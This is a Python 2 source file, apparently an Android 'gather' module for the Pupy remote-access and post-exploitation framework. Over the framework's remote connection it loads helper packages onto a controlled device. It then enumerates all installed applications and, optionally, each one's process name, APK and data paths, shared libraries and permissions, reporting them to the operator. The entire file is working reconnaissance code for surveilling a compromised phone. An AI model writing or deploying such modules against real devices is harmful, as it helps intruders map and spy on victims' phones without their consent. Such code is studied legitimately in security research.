# -*- coding: utf-8 -*-
#Author: @bobsecq
#Contributor(s):

__class_name__="apps"

from pupylib.PupyModule import *
from rpyc.utils.classic import download
from pupylib.utils.common import getLocalAndroidPath

@config(cat="gather", compat=["android"])
class apps(PupyModule):
    """ to interact manage applications """

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog='apps', description=cls.__doc__)
        cls.arg_parser.add_argument('-a', '--get-all', action='store_true', help='get all installed package names')
        cls.arg_parser.add_argument('-d', '--get-all-detailed', action='store_true', help='get all applications installed with details')
        cls.arg_parser.add_argument('-c', '--contain', dest='contain', default=None, help='get all applications installed when package name contains the string given')

    def run(self, args):
        self.client.load_package("pupydroid.utils")
        self.client.load_package("pupydroid.apps")
        if args.get_all==True or args.get_all_detailed==True:
            self.success("Getting applications installed...")
            apps = self.client.conn.modules['pupydroid.apps'].getAllAps()
            self.success("{0} applications installed on the device".format(len(apps)))
            print "Applications installed:"
            if args.get_all_detailed==True:
                print "- Process name: The name of the process this application should run in"
                print "- Source dir: Full path to the base APK for this application"
                print "- Public source dir: Full path to the publicly available parts of sourceDir, including resources and manifest."
                print "- Data dir: Full path to the default directory assigned to the package for its persistent data."
                print "- Shared Lib Files: Paths to all shared libraries this application is linked against. "
            for i, anApp in enumerate(apps):
                if args.get_all_detailed==True:
                    if args.contain == None or (args.contain != None and args.contain in anApp['packageName']):
                        print "-"*30
                        print "- Package name ({1}): {0}".format(anApp['packageName'], i)
                        print "- Process name      : {0}".format(anApp['processName'])
                        print "- Source dir        : {0}".format(anApp['sourceDir'])
                        print "- Public source dir : {0}".format(anApp['publicSourceDir'])
                        print "- Data dir          : {0}".format(anApp['dataDir'])
                        print "- Shared Lib Files  : {0}".format(anApp['sharedLibraryFiles'])
                        print "- Permissions       :"
                        for aPerm in anApp['permissions']:
                            print "   * {0}".format(aPerm)
                elif args.get_all==True:
                    print "[{0}] {1}".format(i, anApp['packageName'])
